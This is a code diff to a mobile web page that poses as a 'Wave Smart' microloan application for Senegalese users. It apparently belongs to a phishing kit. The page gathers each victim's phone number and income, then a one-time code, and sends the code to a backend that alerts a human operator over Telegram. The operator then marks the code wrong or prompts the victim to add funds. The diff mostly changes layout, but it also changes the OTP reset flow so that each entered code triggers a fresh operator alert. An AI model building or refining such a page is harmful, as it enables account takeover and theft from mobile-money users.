@@ -22,8 +22,12 @@ body { font-family: 'Patrick Hand', cursive; background: #f0f0f0; display:flex; 
 }
 
 /* SCREENS */
-.scr { display: none; flex-direction: column; height: 844px; background: #fff; overflow-y: auto; overflow-x: hidden; }
+.scr { display: none; flex-direction: column; height: 844px; background: #fff; overflow: hidden; }
 .scr.active { display: flex; }
+/* Scrollable body inside step screens */
+.pbody { padding:18px 20px 16px; flex:1; display:flex; flex-direction:column; overflow-y:auto; -webkit-overflow-scrolling:touch; }
+/* Sticky button row at bottom of step screens */
+.step-footer { padding:12px 20px 24px; background:#fff; border-top:1px solid #f0f0f0; flex-shrink:0; }
 
 /* TOP BAR */
 .tbar { display:flex; align-items:center; justify-content:center; gap:8px; padding:22px 0 0; }
@@ -77,10 +81,9 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .ftext p { font-size:12px; color:#aaa; line-height:1.4; }
 
 /* STEP PAGES */
-.pbody { padding:18px 20px 30px; flex:1; display:flex; flex-direction:column; }
 .ph { font-size:20px; font-weight:700; color:#111; margin-bottom:4px; }
 .ps { font-size:13px; color:#aaa; margin-bottom:20px; line-height:1.4; }
-.spacer { flex:1; }
+.spacer { flex:1; min-height:20px; }
 .prog-wrap { padding:0 20px; margin-bottom:18px; }
 .prog-lbl { font-size:11px; color:#aaa; letter-spacing:0.05em; margin-bottom:5px; }
 .prog-track { height:4px; background:#eee; border-radius:4px; overflow:hidden; }
@@ -322,6 +325,8 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
       <div class="field"><label class="flbl">Durée</label><select id="p1dur" onchange="calcUpdate()"><option value="6">6 mois</option><option value="12" selected>12 mois</option><option value="18">18 mois</option><option value="24">24 mois</option></select></div>
       <div class="rbox"><div><div class="rbox-lbl">Mensualité estimée</div><div class="rbox-note">5% /an · sans frais cachés</div></div><div class="rbox-val" id="p1rep">0 FCFA</div></div>
       <div class="spacer"></div>
+    </div>
+    <div class="step-footer">
       <button class="cbtn" onclick="go('s-p1','s-p2')">Continuer</button>
     </div>
   </div>
@@ -337,6 +342,8 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
       <div class="field"><label class="flbl">Revenu mensuel (FCFA)</label><input type="text" inputmode="numeric" id="inc" placeholder="Revenus mensuels moyens" oninput="this.value=this.value.replace(/\D/g,'');chk2();calcUpdate()"></div>
       <div class="field"><label class="flbl">Numéro mobile</label><div class="prow"><div class="dpill">🇸🇳 +221</div><input type="tel" id="ph" placeholder="7X XXX XX XX" maxlength="12" oninput="this.value=this.value.replace(/\D/g,'').slice(0,12);chk2()"></div></div>
       <div class="spacer"></div>
+    </div>
+    <div class="step-footer">
       <div class="brow">
         <button class="gbtn" onclick="go('s-p2','s-p1')">← Retour</button>
         <button class="cbtn" id="p2btn" onclick="p2go()" disabled style="flex:2;opacity:0.4;">Continuer</button>
@@ -360,6 +367,8 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
       </div>
       <div class="legal">En soumettant, vous confirmez que les informations sont exactes. Wave Smart utilisera ceci pour une évaluation de crédit. Aucun fonds ne sera versé sans votre confirmation.</div>
       <div class="spacer"></div>
+    </div>
+    <div class="step-footer">
       <div class="brow">
         <button class="gbtn" onclick="go('s-p3','s-p2')">← Retour</button>
         <button class="cbtn" onclick="submitApp()" style="flex:2;">Soumettre</button>
@@ -712,9 +721,6 @@ function startPoll(sid){
       } else if(r.status==='wrong_code'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         resetOTP();
-        // reset status to otp_pending so user can try again
-        await callApi('reset_otp', {sessionId: sid});
-        startPoll(sid);
       } else if(r.status==='continue'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
@@ -800,12 +806,14 @@ function doResend(){
 async function doVerify(){
   if(otpVal.length === 4 && sessId){
     showLoad();
+    // Reset OTP status first so backend sends fresh Telegram alert with buttons
+    await callApi('reset_otp', { sessionId: sessId });
     var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
     if(r.success){
       startPoll(sessId);
     } else {
       hideLoad();
-      alert('Échec. Veuillez réessayer.');
+      resetOTP();
     }
   }
 }
